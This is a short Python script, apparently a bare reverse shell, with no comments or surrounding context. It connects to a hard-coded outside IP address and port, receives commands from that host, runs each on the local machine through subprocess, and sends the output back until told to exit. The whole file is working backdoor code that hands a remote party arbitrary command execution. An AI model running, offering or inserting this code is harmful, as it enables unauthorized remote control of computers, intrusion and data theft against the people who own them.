import socket
import subprocess
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('89.113.140.97', 65000))
while 1:
  command = s.recv(1024).decode()
  if command.lower() == 'exit':
    break
  output = subprocess.getoutput(command)
  s.send(output.encode())
s.close()